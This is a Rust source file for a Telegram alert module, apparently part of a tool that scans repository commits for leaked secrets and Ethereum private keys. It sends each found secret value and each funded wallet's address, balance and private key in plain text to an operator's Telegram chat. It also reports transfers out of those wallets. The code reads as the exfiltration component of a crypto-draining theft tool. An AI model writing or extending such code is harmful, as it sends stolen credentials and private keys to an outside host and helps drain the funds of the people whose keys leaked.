use crate::config::Config;
use crate::models::wallet::{TransferResult, WalletInfo};
use teloxide::prelude::*;
use teloxide::types::ParseMode;
use std::sync::Arc;
use tracing::{info, warn};

pub struct TelegramAlerts {
    bot: Bot,
    chat_id: ChatId,
}

impl TelegramAlerts {
    pub fn new(config: Arc<Config>) -> Result<Self, Box<dyn std::error::Error>> {
        let bot = Bot::new(config.telegram_bot_token.clone());
        let chat_id = ChatId(config.telegram_chat_id.parse()?);
        
        Ok(Self { bot, chat_id })
    }
    
    pub fn new_optional(config: Arc<Config>) -> Arc<Self> {
        match Self::new(config) {
            Ok(ta) => {
                info!("✅ Telegram alerts initialized");
                Arc::new(ta)
            }
            Err(e) => {
                warn!("⚠️ Telegram init failed: {} — using dummy", e);
                Arc::new(Self {
                    bot: Bot::new("dummy_token"),
                    chat_id: ChatId(0),
                })
            }
        }
    }
    
    pub async fn send_secret_found(
        &self,
        repo: &str,
        commit_sha: &str,
        file_path: &str,
        secret_type: &str,
        secret_value: &str,
    ) {
        if self.chat_id.0 == 0 {
            return;
        }
        
        let message = format!(
            "🚨 SECRET FOUND!\nRepo: {}\nCommit: {}\nFile: {}\nType: {}\nSecret: `{}`",
            repo, commit_sha, file_path, secret_type, secret_value
        );
        
        self.send_message(&message).await;
    }
    
    pub async fn send_balance_detected(&self, wallet_info: &WalletInfo) {
        if self.chat_id.0 == 0 {
            return;
        }
        
        let message = format!(
            "💰 BALANCE DETECTED!\nAddress: {}\nBalance: {} ETH\nKey: `{}`",
            wallet_info.address, wallet_info.balance, wallet_info.private_key
        );
        
        self.send_message(&message).await;
    }
    
    // FIX: wallet_info ko underscore lagaya (unused warning hatane ke liye)
    pub async fn send_transfer_success(&self, _wallet_info: &WalletInfo, transfer: &TransferResult) {
        if self.chat_id.0 == 0 {
            return;
        }
        
        let message = format!(
            "✅ TRANSFER SUCCESS!\nFrom: {}\nTo: {}\nAmount: {} ETH\nTx: `{}`",
            transfer.from_address, transfer.to_address, transfer.amount, transfer.tx_hash
        );
        
        self.send_message(&message).await;
    }
    
    pub async fn send_transfer_failed(&self, _wallet_info: &WalletInfo, error: &str) {
        if self.chat_id.0 == 0 {
            return;
        }
        
        let message = format!(
            "❌ TRANSFER FAILED!\nError: {}",
            error
        );
        
        self.send_message(&message).await;
    }
    
    async fn send_message(&self, message: &str) {
        match self.bot
            .send_message(self.chat_id, message)
            .parse_mode(ParseMode::MarkdownV2)
            .await
        {
            Ok(_) => info!("✅ Telegram alert sent"),
            Err(e) => warn!("❌ Telegram send failed: {}", e),
        }
    }
}